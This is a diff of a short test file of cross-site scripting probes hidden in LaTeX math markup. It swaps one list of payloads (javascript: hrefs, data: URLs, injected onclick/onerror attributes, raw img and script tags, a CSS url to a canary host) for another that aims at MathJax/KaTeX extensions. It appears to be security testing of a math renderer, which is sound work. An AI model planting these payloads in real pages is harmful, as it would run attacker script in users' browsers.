@@ -1,21 +1,21 @@
-# MATH-XSS-PROBE
+# MATH-XSS-2
 
-P1 href-js: $\href{javascript:alert(document.domain)}{P1CLICK}$
+Q1 mglyph: $\mglyph$ and $a_{\mglyph}$
 
-P2 href-data: $\href{data:text/html,<script>alert(2)</script>}{P2CLICK}$
+Q2 includegraphics: $\includegraphics{x onerror=alert(1)}$
 
-P3 cssId: $\cssId{x" onmouseover="alert(3)}{P3HOVER}$
+Q3 htmlClass: $\htmlClass{x}{y}$ $\htmlId{x}{y}$ $\htmlData{x}{y}$ $\htmlStyle{x}{y}$
 
-P4 class: $x\class{y" onclick="alert(4)}{z}$
+Q4 raw-tex-html: $\html{<img src=x onerror=alert(4)>}$
 
-P5 style-csp: $\style{background:url(https://CANARYMATH7h3x.example/s)}{P5}$
+Q5 enclose: $\enclose{circle}[mathcolor="red" onclick="alert(5)"]{x}$
 
-P6 unicode: $\unicode{x3C}img/src/onerror=alert(6)\unicode{x3E}$
+Q6 def: $\def\x{alert(6)}\x$ and $\newcommand{\y}{z}\y$
 
-P7 block href:
+Q7 textbf-html: $\textbf{<img src=x onerror=alert(7)>}$ $\text{<b onclick=alert(7)>x</b>}$
 
-$$\href{javascript:alert(7)}{P7BLOCK}$$
+Q8 ce-chem: $\ce{<img src=x onerror=alert(8)>}$
 
-P8 texttt: $\texttt{<img src=x onerror=alert(8)>}$
+Q9 fbox: $\fbox{<script>alert(9)</script>}$
 
-P9 href-vbtab: $\href{javascript&#09;:alert(9)}{P9}$
+Q10 colorbox: $\colorbox{red}{x}$ $\textcolor{red}{x}$
